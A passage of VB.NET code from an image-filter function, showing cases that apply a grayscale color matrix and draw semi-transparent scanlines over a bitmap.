                                    New Single() {0, 0, 0, 1, 0},
                                    New Single() {0, 0, 0, 0, 1}
                        })
                    Using g As Graphics = Graphics.FromImage(bmp)
                        Using ia As System.Drawing.Imaging.ImageAttributes = New System.Drawing.Imaging.ImageAttributes()
                            ia.SetColorMatrix(gMatrix)
                            g.DrawImage(img, New Rectangle(0, 0, img.Width, img.Height), 0, 0, img.Width, img.Height,
                                                             GraphicsUnit.Pixel, ia)
                        End Using
                    End Using
                    Return bmp
                Case "Raw-01" ' raw gray 
                    Dim bmp As Bitmap = New Bitmap(img.Width, img.Height)
                    Dim gMatrix As New System.Drawing.Imaging.ColorMatrix(
                        {
                                    New Single() {0.299, 0.299, 0.299, 0, 0},
                                    New Single() {0.587, 0.587, 0.587, 0, 0},
                                    New Single() {0.114, 0.114, 0.114, 0, 0},
                                    New Single() {0, 0, 0, 1, 0},
                                    New Single() {0, 0, 0, 0, 1}
                        })
                    Using g As Graphics = Graphics.FromImage(bmp)
                        Using ia As System.Drawing.Imaging.ImageAttributes = New System.Drawing.Imaging.ImageAttributes()
                            ia.SetColorMatrix(gMatrix)
                            g.DrawImage(img, New Rectangle(0, 0, img.Width, img.Height), 0, 0, img.Width, img.Height,
                                                             GraphicsUnit.Pixel, ia)
                            For y As Integer = 0 To img.Height Step 3
                                g.DrawLine(New Pen(Color.FromArgb(75, 0, 0, 0), 1), New Point(0, y), New Point(img.Width, y))
                            Next
                        End Using
                    End Using
                    Return bmp
                Case "Raw-02" ' raw color
                    Dim bmp As Bitmap = New Bitmap(img.Width, img.Height)
                    Using g As Graphics = Graphics.FromImage(bmp)
                        g.DrawImage(img, New Rectangle(0, 0, img.Width, img.Height), 0, 0, img.Width, img.Height,
                                                             GraphicsUnit.Pixel)
                        For y As Integer = 0 To img.Height Step 3
                            g.DrawLine(New Pen(Color.FromArgb(75, 0, 0, 0), 1), New Point(0, y), New Point(img.Width, y))
                        Next
                    End Using
                    Return bmp
            End Select

            Return img

        End Function



    End Class
End Namespace